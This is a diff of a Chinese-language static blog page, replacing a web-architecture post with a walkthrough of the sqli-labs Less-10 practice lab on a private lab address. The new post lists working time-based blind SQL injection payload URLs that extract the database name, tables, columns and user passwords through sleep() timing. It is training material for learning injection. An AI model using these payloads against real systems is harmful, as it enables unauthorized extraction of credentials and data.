@@ -4,12 +4,12 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="web应用架构, Junk Blog">
-    <meta name="description" content="web 应用工作流程
+    <meta name="keywords" content="sqli-labs-Less10, Junk Blog">
+    <meta name="description" content="前言和 Less9 同样是时间注入，只是将 “单引号” 改成了 “双引号”
+注入步骤基于时间的GET双引号盲注
+判断数据库字符串的长度
 
-首先使用 User’s browser 访问图片网站，然后浏览器向 DNS 服务器发送请求，最后 User’s browser 从 DNS 服务器获取 IP 地址。
-
-User’s browser 向 web App">
+http://192.168.150.128/sqli-labs-master/Less-10/?id">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@ User’s browser 向 web App">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>web应用架构 | Junk Blog</title>
+    <title>sqli-labs-Less10 | Junk Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -286,13 +286,13 @@ User’s browser 向 web App">
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('https://i.loli.net/2019/10/11/wlCs3MhG7rkf8Ui.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('https://i.loli.net/2019/10/21/z7BKnYbroNPDZOF.png')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        web应用架构
+                        sqli-labs-Less10
                     </div>
                 </div>
             </div>
@@ -384,8 +384,12 @@ User’s browser 向 web App">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web/" target="_blank">
-                                <span class="chip bg-color">web</span>
+                            <a href="/tags/sqli-labs/" target="_blank">
+                                <span class="chip bg-color">sqli-labs</span>
+                            </a>
+                        
+                            <a href="/tags/SQL-Injection/" target="_blank">
+                                <span class="chip bg-color">SQL Injection</span>
                             </a>
                         
                     </div>
@@ -396,8 +400,8 @@ User’s browser 向 web App">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/web/" class="post-category" target="_blank">
-                                web
+                            <a href="/categories/Web-security/" class="post-category" target="_blank">
+                                Web security
                             </a>
                         
                     </div>
@@ -408,14 +412,14 @@ User’s browser 向 web App">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-09-23
+                    2019-10-23
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        538
+                        399
                     </div>
                     
 
@@ -438,33 +442,32 @@ User’s browser 向 web App">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="web-应用工作流程"><a href="#web-应用工作流程" class="headerlink" title="web 应用工作流程"></a>web 应用工作流程</h1><p><img src="https://i.loli.net/2019/09/27/7bOLa2pf3rvFwCc.png" alt="web.png"></p>
-<ol>
-<li><p>首先使用 User’s browser 访问<a href="https://www.storyblocks.com/stock-image/strong-beautiful-fog-and-sunbeams-in-the-forest-bxxg0dvxdzj6gt9ini" target="_blank" rel="noopener">图片网站</a>，然后浏览器向 DNS 服务器发送请求，最后 User’s browser 从 DNS 服务器获取 IP 地址。</p>
-</li>
-<li><p>User’s browser 向 web Application server（web应用服务器） 发送请求，请求会先到达 Load Balancer(负载均衡服务)</p>
-</li>
-<li><p>Load Balancer 向多个 web Application server 发送这个请求，其中资源使用率最少的 web Application server 来处理这个请求。</p>
-</li>
-<li><p>web Application server 向 Caching Service（缓存服务）查找图片信息。</p>
-</li>
-<li><p>web Application server 从数据库中调取其他信息。</p>
-</li>
-<li><p>（a）当 web Application server 发现图片还没有进行色彩渲染，于是便向 Job Queue（任务队列） 发送 “色彩渲染” 的任务。（b）Job Server（任务服务）从 Job Queue（任务队列）中获取色彩渲染的任务进行异步计算，计算结束后再将结果更新到数据库。</p>
-</li>
-<li><p>Web Application Server会给search service(搜索服务)发送搜索请求，以图片的标题作为关键词，来查找相似的图片。</p>
-</li>
-<li><p>如果用户恰好是登录状态，Web Application Server会去访问Account Service(账号服务器)来获取账号信息。</p>
-</li>
-<li><p>（a）Web Application Server 会给 data firehose (数据加载服务)发送一个 Page View (网页浏览)事件，（b）并把它记录到的 Cloud Storage System(存储云)，（c）最终加载到 的Data Warehouse (数据仓库)中，并将这些数据提供给数据分析师来进行商务分析。</p>
-</li>
-<li><p>Web Application Server 会渲染出 HTML，并把它通过 Load Balancer 发送给用户的浏览器。页面中的 JavaScript 和 CSS 文件存储在我们的 Cloud Storage System (存储云)中</p>
-</li>
-<li><p>通过 CDN 进行分发 javascript 和 CSS 文件。因此，用户的浏览器会直接访问 CDN 来获取 JavaScript 和 CSS 文件。最后，浏览器再渲染整个页面给用户看。</p>
-</li>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和 Less9 同样是时间注入，只是将 “单引号” 改成了 “双引号”</p>
+<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="基于时间的GET双引号盲注"><a href="#基于时间的GET双引号盲注" class="headerlink" title="基于时间的GET双引号盲注"></a>基于时间的GET双引号盲注</h2><ol>
+<li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://juejin.im/post/5b69a8eef265da0f926baa56#heading-10" target="_blank" rel="noopener">[译] Web 应用架构基础课</a></p>
-<p><a href="https://blog.csdn.net/fundebug/article/details/81867196" target="_blank" rel="noopener">Web应用架构入门之11个基本要素</a></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(length(database()))&gt;56, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/20/yPOJlxQK7fB69u4.png" alt="less10-1.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(length(database()))=56, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/20/Vfd7gaj4nK8CFsN.png" alt="less10-2.png"></p>
+<ol start="2">
+<li><strong>判断数据库</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/20/xuRBE6a1CdqSYT7.png" alt="less10-3.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr(database(),1,1))=115, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/20/WFPj8zL3QYrURAJ.png" alt="less10-4.png"></p>
+<ol start="3">
+<li><strong>判断表</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;101, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/20/ycveLYBhmkOlMVR.png" alt="less10-5.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/20/ZELaSOh3lvyU9zu.png" alt="less10-6.png"></p>
+<ol start="4">
+<li><strong>判断字段</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/20/mfMaVkzvBH4FlJQ.png" alt="less10-7.png"></p>
+<ol start="5">
+<li><strong>判断数据</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select username FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/20/6vkYrFOqgJZNceP.png" alt="less10-8.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-10/?id=1" and if(ascii(substr((select password FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/20/D7OVrNTeM94aqcx.png" alt="less10-9.png"></p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8318762.html" target="_blank" rel="noopener">【sqli-labs】 less10 GET - Blind - Time based. - Double quotes (基于时间的双引号盲注)</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -506,7 +509,7 @@ User’s browser 向 web App">
                     </span>
                     <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="b-link-green">Junk Blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/09/23/web应用架构/" class="b-link-green">web应用架构</a>
+                    <a href="/2019/10/23/sqli-labs-Less10/" class="b-link-green">sqli-labs-Less10</a>
                 </p>
             </div>
         </div>
@@ -525,7 +528,7 @@ User’s browser 向 web App">
 <script src="/libs/gitment/gitment.js"></script>
 <script>
 var gitment = new Gitment({
-    id: 'Mon Sep 23 2019 09:17:03 GMT+0800',
+    id: 'Wed Oct 23 2019 23:20:11 GMT+0800',
     owner: '315053891',
     repo: 'hhkk2334.github.io',
     oauth: {
@@ -549,27 +552,29 @@ gitment.render('gitment-content');
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/09/28/sqli-labs-Less5/">
+                <a href="/2019/10/23/sqli-labs-Less10/">
                     <div class="card-image">
                         
-                        <img src="https://i.loli.net/2019/10/10/UO8tQTgZNyVChWi.png" class="responsive-img" alt="sqli-labs-Less5">
+                        <img src="https://i.loli.net/2019/10/21/z7BKnYbroNPDZOF.png" class="responsive-img" alt="sqli-labs-Less10">
                         
-                        <span class="card-title">sqli-labs-Less5</span>
+                        <span class="card-title">sqli-labs-Less10</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">前言什么是双查询？双查询就是在 select 语句中再插入一个 select 语句，如下图所示：
+                    <div class="summary">前言和 Less9 同样是时间注入，只是将 “单引号” 改成了 “双引号”
+注入步骤基于时间的GET双引号盲注
+判断数据库字符串的长度
 
-在查询的时候，会先执行 select database() 语句，然后再将该语句的执行结果传递给 count() 函数，从内到外依次执行。
-</div>
+http://192.168.150.128/sqli-labs-master/Less-10/?id</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -582,6 +587,7 @@ gitment.render('gitment-content');
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -604,30 +610,30 @@ gitment.render('gitment-content');
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/09/16/sqli-labs Less4/">
+                <a href="/2019/10/20/5G科普/">
                     <div class="card-image">
                         
-                        <img src="https://i.loli.net/2019/10/10/Anm4tFiJbkBvZPw.png" class="responsive-img" alt="sqli-labs-Less4">
+                        <img src="https://i.loli.net/2019/10/19/2nQU8jGsa3x6fYX.jpg" class="responsive-img" alt="5G科普">
                         
-                        <span class="card-title">sqli-labs-Less4</span>
+                        <span class="card-title">5G科普</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">前言这一关是 “双引号+括号” 的字符型注入，SQL执行语句为select * from 表名 where id=("1")
-注入步骤基于错误的GET双引号字符型注入
-GET 方式提交 id
-
-http://192.168.150.128/</div>
+                    <div class="summary">原作者：小枣君
+原出处：鲜枣课堂
+原链接：有史以来最强的5G入门科普！
+前言此文从通信技术的角度科普 5G 知识，解释了 5G 通信技术的优缺点。
+什么是 5G？5G 就是第五代通信技术，主要特点是波长为毫米级，超宽带，超高速度，超低延时。</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-16
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-20
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web-security/" class="post-category" target="_blank">
-                                    Web security
+                            <a href="/categories/科普/" class="post-category" target="_blank">
+                                    科普
                                 </a>
                             
                             
@@ -637,12 +643,12 @@ http://192.168.150.128/</div>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/sqli-labs/" target="_blank">
-                        <span class="chip bg-color">sqli-labs</span>
+                    <a href="/tags/通信/" target="_blank">
+                        <span class="chip bg-color">通信</span>
                     </a>
                     
-                    <a href="/tags/SQL-Injection/" target="_blank">
-                        <span class="chip bg-color">SQL Injection</span>
+                    <a href="/tags/5G/" target="_blank">
+                        <span class="chip bg-color">5G</span>
                     </a>
                     
                 </div>
